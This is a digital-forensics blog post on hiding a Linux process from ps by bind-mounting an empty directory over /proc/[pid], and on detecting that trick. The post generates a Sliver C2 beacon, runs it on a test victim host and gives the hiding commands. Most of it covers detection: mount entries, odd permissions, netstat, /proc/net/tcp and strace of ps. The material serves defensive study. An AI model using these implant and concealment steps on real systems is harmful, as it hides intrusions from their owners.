<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://dfir.ch/posts/slash-proc/">Original</a>
    <h1>The &#39;Invisibility Cloak&#39; – Slash-Proc Magic</h1>
    
    <div id="readability-page-1" class="page"><div>
                <h2 id="introduction">Introduction</h2>
<p>While working my way through the excellent “Linux Attack, Detection and Live Forensics” course from <a href="https://dfir.ch/posts/slash-proc/defensive-security.com">Defensive Security</a>, I read the following line: <em>If you are looking for a simple way how to hide your process from the process list, then the bind mount operation is the answer.</em> In order not to violate any copyright, I googled around and found the following gist from <a href="https://twitter.com/timb_machine">Timb-machine</a>, where the same commands of the course are reflected:</p>
<p><img src="https://dfir.ch/images/slash-proc/github.png" alt="Messing with slash-proc" title="Messing with slash-proc"/></p>
<figcaption>Figure 1: Messing with slash-proc</figcaption>
<p>I couldn’t find out who first developed this technique, but if somebody pointed me to a blog or paper with more information, I’d be happy to update the blog post.</p>
<p>The code or technique was not explained further in the course, only hinting that it can be used to hide processes from the process list. In the following blog post, we will take a closer look at how this technique works, whether we can hide our processes so easily, and more importantly, which forensic artifacts we can use to detect this technique.</p>
<p>To avoid recreating recreate the wheel, the following is a screenshot from an excellent answer on <a href="https://unix.stackexchange.com/questions/198590/what-is-a-bind-mount">stackexchange</a> to the question: “What is a bind mount?”.</p>
<p><img src="https://dfir.ch/images/slash-proc/bind_mount.png" alt="bind mount explained" title="bind mount explained"/></p>
<figcaption>Figure 2: mount bind explained</figcaption>
<h2 id="setting-the-stage">Setting the stage</h2>
<p><strong>Attacker host</strong></p>
<p>Our first step is creating a new Sliver binary, which we will execute on our target host later. Sliver, a post-exploitation framework, empowers an attacker to remotely control and interact with compromised systems, also known as ‘slivers ‘. It offers a wide range of capabilities for post-exploitation activities. For detailed instructions on setting up a new Sliver server or interacting with slivers, refer to the official Sliver <a href="https://sliver.sh/docs?name=Getting+Started">wiki</a>.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span>[</span>server<span>]</span> sliver &gt; generate beacon -f exe --os linux --mtls &lt;domain&gt;:9191 --skip-symbols -s /tmp/
</span></span><span><span>
</span></span><span><span><span>[</span>*<span>]</span> Generating new linux/amd64 beacon implant binary <span>(</span>1m0s<span>)</span>
</span></span><span><span><span>[</span>!<span>]</span> Symbol obfuscation is disabled
</span></span><span><span><span>[</span>*<span>]</span> Build completed in 00:00:17
</span></span><span><span><span>[</span>*<span>]</span> Implant saved to /tmp/DISTANT_VISUAL
</span></span></code></pre></div><p>Sliver creates specific file names for each beacon, in our case DISTANT_VISUAL. These file names can also be customized and must not be adopted. We now start a Sliver listener on port 9191, where the beacon will connect back after execution on our victim host.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span>[</span>server<span>]</span> sliver &gt; mtls -l <span>9191</span>
</span></span><span><span>
</span></span><span><span><span>[</span>*<span>]</span> Starting mTLS listener ...
</span></span><span><span>
</span></span><span><span><span>[</span>*<span>]</span> Successfully started job <span>#1</span>
</span></span></code></pre></div><p>We copied the Sliver binary created above to the Victim host and executed the binary (the &amp; moves the process to the background).</p>
<p><strong>Victim host</strong></p>
<pre tabindex="0"><code># ./DISTANT_VISUAL &amp;
</code></pre><p><strong>Attacker host</strong></p>
<p>Back on the attacker host (in the Sliver console), the host on which we executed the beacon has now checked in - our created binary has worked as desired.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span>[</span>server<span>]</span> sliver &gt; <span>jobs</span>
</span></span><span><span>
</span></span><span><span> ID   Name   Protocol   <span>Port</span> 
</span></span><span><span><span>====</span> <span>======</span> <span>==========</span> <span>======</span>
</span></span><span><span> <span>1</span>    mtls   tcp        <span>9191</span> 
</span></span><span><span>
</span></span><span><span><span>[</span>*<span>]</span> Beacon 5628db38 DISTANT_VISUAL - 135.&lt;redacted&gt;:41462 <span>(</span>dfir_rocks<span>)</span> - linux/amd64 - Wed, <span>27</span> Mar <span>2024</span> 13:11:16 CET
</span></span></code></pre></div><p>We can briefly test the functionality with a simple command like <em>ls</em>:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span>[</span>server<span>]</span> sliver <span>(</span>DISTANT_VISUAL<span>)</span> &gt; ls
</span></span><span><span>
</span></span><span><span><span>[</span>*<span>]</span> Tasked beacon DISTANT_VISUAL <span>(</span>8a47457f<span>)</span>
</span></span><span><span>
</span></span><span><span><span>[</span>+<span>]</span> DISTANT_VISUAL completed task 8a47457f
</span></span><span><span>
</span></span><span><span>/root <span>(</span><span>19</span> items, 8.8 MiB<span>)</span>
</span></span><span><span><span>=========================</span>
</span></span><span><span>-rw-------  .bash_history    3.3 KiB  Wed Mar <span>27</span> 09:57:04 +0100 <span>2024</span>
</span></span><span><span>-rw-r--r--  .bash_logout     <span>18</span> B     Sun Dec <span>29</span> 03:26:31 +0100 <span>2013</span>
</span></span><span><span>-rw-r--r--  .bash_profile    <span>176</span> B    Sun Dec <span>29</span> 03:26:31 +0100 <span>2013</span>
</span></span><span><span>-rw-r--r--  .bashrc          <span>293</span> B    Mon Mar <span>25</span> 08:36:40 +0100 <span>2024</span>
</span></span><span><span><span>[</span>..<span>]</span>
</span></span></code></pre></div><p><strong>Victim host:</strong></p>
<p>Out of the box, the Sliver binary makes no effort to hide on the host. Using a process listing with ps, we can easily find the process, which would probably be noticed relatively quickly in a forensic investigation.</p>
<pre tabindex="0"><code># ps aux | grep DISTANT
root     22665  0.1  0.3 709792  5520 [..] ./DISTANT_VISUAL
root     22710  0.0  0.0 112808   968 [..] grep --color=auto DISTANT
</code></pre><p>However, when we turn our attention again to the few commands on the gist from timb-machine..</p>
<pre tabindex="0"><code># mkdir -p spoof/fd; 
# mount -o bind spoof /proc/22665; 
</code></pre><p><img src="https://dfir.ch/images/slash-proc/southpark.jpg" alt="And it’s gone" title="And it&#39;s gone"/></p>
<figcaption>Figure 2: And it&#39;s gone</figcaption>
<p>We issue the same command as above (with ps), but we can’t find our binary this time.</p>
<pre tabindex="0"><code># ps aux | grep DISTANT
root     23819  0.0  0.0 112808 968 [..] grep --color=auto DISTANT
</code></pre><p>Checking the corresponding folder under /proc:</p>
<pre tabindex="0"><code># ls -la /proc/22665/fd
# 
</code></pre><p>Without the hiding technique, the folder would not be empty:</p>
<pre tabindex="0"><code>[root@dfir ~]# ls -l /proc/22665/
total 0
dr-xr-xr-x. 2 root root 0 Mar 28 12:40 attr
-rw-r--r--. 1 root root 0 Mar 28 12:40 autogroup
-r--------. 1 root root 0 Mar 28 12:40 auxv
-r--r--r--. 1 root root 0 Mar 28 12:32 cgroup
--w-------. 1 root root 0 Mar 28 12:40 clear_refs
-r--r--r--. 1 root root 0 Mar 28 12:28 cmdline
-rw-r--r--. 1 root root 0 Mar 28 12:40 comm
-rw-r--r--. 1 root root 0 Mar 28 12:40 coredump_filter
-r--r--r--. 1 root root 0 Mar 28 12:40 cpuset
lrwxrwxrwx. 1 root root 0 Mar 28 12:28 cwd -&gt; /root
-r--------. 1 root root 0 Mar 28 12:28 environ
lrwxrwxrwx. 1 root root 0 Mar 28 12:28 exe -&gt; /root/DISTANT_VISUAL
[..]
</code></pre><p>What’s going on?</p>
<p><strong>mkdir -p spoof/fd:</strong> This command creates a directory named spoof with a subdirectory fd.</p>
<p><strong>mount -o bind spoof /proc/[pid]</strong>: This command mounts the spoof directory onto the /proc/[pid] directory. By doing this, it tricks the system into displaying the contents of the spoof directory when someone accesses the /proc/[pid] directory. By someone, we mean, for example, a tool like ps that relies heavily on the /proc/ directory to generate output (see the section <em>strace (ps deep-dive)</em>, where we examine how the ps command works and why we can hide our binary in this simple way.</p>
<p><strong>ln -s socket:[283] /proc/[pid]/fd/99</strong>: This command from the original gist (see above) creates a symbolic link (ln -s) named 99 in the /proc/[pid]/fd/ directory. The link points to a specific socket (socket:[283]), which is likely associated with a network connection or communication channel of the process. In our tests, it was not necessary to create such a symlink.</p>
<p><strong>ls -la /proc/[pid]/fd</strong>: This command lists all file descriptors (fd) associated with the process identified by [pid]. However, because we have mounted an empty directory (spoof/fd) over the correct /proc/ directory from the process, we have no files and folders that are displayed.</p>
<h2 id="forensics">Forensics</h2>
<p><strong>/proc/mounts</strong></p>
<p>Analyzing <em>/proc/mounts</em> indicates that at least one filesystem is mounted onto a directory that typically corresponds to a process ID (PID), as evidenced by entries like ‘/proc/PID’ in the ‘/proc/mounts’ listing. See the last line of the /proc/mounts output below, where we clearly see the mapping of the <em>/proc/22665</em> folder.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># cat /proc/mounts </span>
</span></span><span><span>rootfs / rootfs rw <span>0</span> <span>0</span>
</span></span><span><span>sysfs /sys sysfs rw,seclabel,nosuid,nodev,noexec,relatime <span>0</span> <span>0</span>
</span></span><span><span><span>[</span>...<span>]]</span>
</span></span><span><span>/dev/mapper/centos-root /proc/22665 xfs rw,seclabel,relatime,attr2,inode64,noquota <span>0</span> <span>0</span>
</span></span></code></pre></div><p>In a normal investigation, my next step would be to look at the process’s/proc/ filesystem to learn more about the process (command line, environment variables, maps, etc.). In this case, however, the directory is empty, as we have seen above, which is a huge red flag that something is amiss.</p>
<pre tabindex="0"><code># ls /proc/22665/fd/
# 
</code></pre><p><strong>Bogus Permissions</strong></p>
<p>The /proc directory for our Sliver process (PID 22665) allows writing to the directory. This is an unusual permission for this directory as normally, the PID directories under /proc should be read-only. For comparison, here are the permissions of the /proc/ folder holding our Sliver binary:</p>
<pre tabindex="0"><code># ls -latrh /proc/ | grep 22665
drwxr-xr-x.   3 root     root       16 Mar 26 14:49 22665
</code></pre><p>Compared to other directories within /proc:</p>
<pre tabindex="0"><code>dr-xr-xr-x.   9 root     root        0 Mar 26 21:11 2486
dr-xr-xr-x.   9 root     root        0 Mar 26 21:11 13713
dr-xr-xr-x.   9 root     root        0 Mar 26 21:11 13857
dr-xr-xr-x.   9 root     root        0 Mar 26 21:11 13860
</code></pre><p>This strongly indicates that something is not normal with this process and needs to be analyzed more closely. <a href="https://sandflysecurity.com/">Sandfly</a>, for example, has these two checks built in.</p>
<h2 id="netstat">netstat</h2>
<p>However, the connection to the C2 server appears in the output of the netstat command, but without an indication of which process this connection belongs to (another anomaly).</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># netstat -nalp | grep 9191</span>
</span></span><span><span>tcp        <span>0</span>      <span>0</span> 192.168.38.244:42362    144.&lt;redacted&gt;:9191      ESTABLISHED - 
</span></span></code></pre></div><p>By default, our Sliver beacon will not check every second for new commands, but “<em>The “Next Check-in” value includes any random jitter (by default up to 30s)</em>”. For demonstration, the following one-liner periodically executes netstat and filters for the first octet of our C2 IP address. In this case, we haven’t applied the hiding technique, thus the process name and the PID are visible.</p>
<pre tabindex="0"><code># while true; do netstat -nalp | grep -i 144; done
tcp        0      1 192.168.38.244:33536    144.&lt;redacted&gt;:9191      SYN_SENT    22665/./DISTANT_VISU 
tcp        0    267 192.168.38.244:33536    144.&lt;redacted&gt;9191      ESTABLISHED 22665/./DISTANT_VISU 
tcp        0      0 192.168.38.244:33536    144.&lt;redacted&gt;:9191      ESTABLISHED 22665/./DISTANT_VISU 
tcp        0    742 192.168.38.244:33536    144.&lt;redacted&gt;:9191      ESTABLISHED 22665/./DISTANT_VISU 
tcp        0    916 192.168.38.244:33536    144.&lt;redacted&gt;:9191      FIN_WAIT1   -    
</code></pre><h2 id="diggin-deeper">Diggin deeper</h2>
<p>We have found out that we can hide the process from tools like ps relatively easily without affecting the program’s functionality. However, the C2 connection appears in netstat. We recorded the execution of netstat with strace and found two interesting files that are read by netstat.</p>
<p><strong>nf_conntrack</strong></p>
<p>The nf_conntrack file, typically found in the /proc directory, provides information about the network connections being tracked by the Netfilter connection tracking system. Netfilter is a framework within the Linux kernel that provides functionalities for packet filtering, network address translation (NAT), and other packet mangling operations. The contents of the nf_conntrack file are dynamically updated by the kernel as network connections are established, modified, or terminated. Each time a new connection is initiated, or an existing connection state changes, the corresponding entry in the nf_conntrack file is updated accordingly.</p>
<pre tabindex="0"><code>nf_conntrack:ipv4     2 tcp      6 0 CLOSE src=192.168.38.244 dst=144.&lt;redacted&gt; sport=34932 dport=9191 src=144.&lt;redacted&gt; dst=192.168.38.244 sport=9191 dport=34932 [ASSURED] mark=0 secctx=system_u:object_r:unlabeled_t:s0 zone=0 use=2
</code></pre><p>The /proc/net/tcp file is a special file in the /proc directory on Linux systems that provides information about the active TCP connections on the system. This file allows users, processes, and system administrators to inspect the state of TCP connections, including details such as source and destination addresses, port numbers, connection states, and other relevant information.</p>
<p>IP addresses in each column are stored in hexadecimal notation in the ‘Little Endian’ format (but not the port numbers):</p>
<pre tabindex="0"><code>  29: F426A8C0:8C82 &lt;redacted&gt;:23E7 02 00000001:00000000 01:00000064 00000000     0        0 8429573 2 ffff9480c12e8000 100 0 0 10 -1   
</code></pre><ul>
<li>F426A8C0 = C0 A8 26 F4 = The IP address of the victim (192.168.38.244)</li>
<li>23E7 = 9191 = The port our Slliver beacon connects to on the attacker’s machine</li>
</ul>
<h2 id="back-again">Back again</h2>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># umount /proc/22665</span>
</span></span><span><span><span># ps aux | grep DISTANT</span>
</span></span><span><span>root     <span>10171</span>  0.0  0.0 <span>112808</span>   <span>968</span> pts/0    S+   17:56   0:00 grep --color<span>=</span>auto DISTANT
</span></span><span><span>root     <span>22665</span>  0.0  0.3 <span>711200</span>  <span>5532</span> pts/0    Sl   13:11   0:05 ./DISTANT_VISUAL
</span></span></code></pre></div><h2 id="strace-ps-deep-dive">strace (ps deep-dive)</h2>
<p>As we saw above, our Sliver Beacon was no longer visible within the ps output. What information from which files and folders does ps obtain to generate the output? We start a strace session and use a random any program currently running on our system. See my post <a href="https://dfir.ch/posts/strace/">[s|l]trace - Linux Malware Analysis</a> as a strace primer.</p>
<p><strong>/proc/[pid]/stat</strong></p>
<pre tabindex="0"><code>stat(&#34;/proc/22551&#34;, {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
open(&#34;/proc/22551/stat&#34;, O_RDONLY)      = 6
read(6, &#34;22551 (sshd) S 22543 22543 22543&#34;..., 2048) = 365
</code></pre><p>The /proc/[pid]/stat file in Linux provides status information about a specific process identified by its process ID (PID). It contains a single line of text with various fields separated by spaces, each representing different attributes of the process.</p>
<pre tabindex="0"><code># cat /proc/22551/stat
22551 (sshd) S 22543 22543 22543 0 -1 1077944640 
481 0 3 0 11 47 0 0 20 0 1 0 18909165 158507008 
450 18446744073709551615 94679745945600 94679746763604 
140736237722176 140736237719352 139979359492899 0 0 4096 
65536 18446744072090956901 0 0 17 0 0 0 0 0 0 94679748861320 
94679748876788 94679775510528 140736237723477 140736237723498 
140736237723498 140736237723625 0
</code></pre><p>The values above correspond to the following fields:</p>
<ul>
<li>PID (Process ID): The unique identifier for the process.</li>
<li>Comm: The filename of the executable, in parentheses. This is often truncated to 15 characters.</li>
<li>State: The current state of the process. Common states include “R” for running, “S” for sleeping, “D” for uninterruptible sleep, “Z” for zombie, and others.</li>
<li>PPid (Parent Process ID): The PID of the parent process.</li>
<li>.. and so on..</li>
</ul>
<p>Head over to the <a href="https://man7.org/linux/man-pages/man5/proc.5.html">proc5</a> manpage for a complete list of the fields.</p>
<p><strong>/proc/[pid]/status</strong></p>
<p>Next, ps opens /proc/[pid]/status, where this file provides much of the information in /proc/pid/stat and /proc/pid/statm in a format easier for humans to parse. Just compare the output below (from the status file) and above (from the stat file) :)</p>
<pre tabindex="0"><code>open(&#34;/proc/22551/status&#34;, O_RDONLY)    = 6
</code></pre><pre tabindex="0"><code># cat /proc/22551/status
Name:	sshd
Umask:	0022
State:	S (sleeping)
Tgid:	22551
Ngid:	0
Pid:	22551
PPid:	22543
TracerPid:	0
Uid:	1002	1002	1002	1002
Gid:	1002	1002	1002	1002
FDSize:	64
Groups:	10 1002 
VmPeak:	  154820 kB
VmSize:	  154792 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	    2640 kB
VmRSS:	    1800 kB
RssAnon:	    1152 kB
RssFile:	     648 kB
RssShmem:	       0 kB
VmData:	     792 kB
VmStk:	     132 kB
VmExe:	     800 kB
VmLib:	   13064 kB
VmPTE:	     312 kB
VmSwap:	     184 kB
Threads:	1
SigQ:	0/5887
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000000001000
SigCgt:	0000000180010000
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000001fffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Speculation_Store_Bypass:	not vulnerable
Cpus_allowed:	3
Cpus_allowed_list:	0-1
Mems_allowed:	00000000,00000000,00000000,00000000,[...],00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	2997
nonvoluntary_ctxt_switches:	0
</code></pre><p><strong>/proc/[pid]/cmdline</strong></p>
<p>Last but not least, ps reads the content of the file /proc/[pid]/cmdline, which contains the command-line arguments passed to the process.</p>
<pre tabindex="0"><code>open(&#34;/proc/22551/cmdline&#34;, O_RDONLY)   = 6
</code></pre><p>And the actual output:</p>
<pre tabindex="0"><code># cat /proc/22551/cmdline
sshd: malmoeb@pts/0
</code></pre><p><strong>Final output to the console</strong></p>
<p>Putting the pieces together, ps writes the gathered information from the various files within /proc/[pid]/ to the console.</p>
<pre tabindex="0"><code>write(1, &#34;malmoeb 22551  0.0  0.1 154792 &#34;..., 86) = 86
</code></pre><p>And on the terminal:</p>
<pre tabindex="0"><code>malmoeb 22551  0.0  0.1 154792  1800 ? D 13:10   0:00 sshd: malmoeb@pts/0
</code></pre><h2 id="conclusion">Conclusion</h2>
<p>By leveraging bind mounts to overlay a /proc/<pid> directory, we demonstrated how a process can seemingly vanish from process listings while maintaining its functionality.</pid></p>
<p>Through practical experimentation and analysis, we’ve uncovered the potential forensic artifacts left behind by such techniques, including anomalous filesystem mounts and empty process directories. These indicators can serve as valuable clues for forensic investigators seeking to uncover hidden processes and detect malicious activity on compromised systems.</p>

            </div></div>
  </body>
</html>
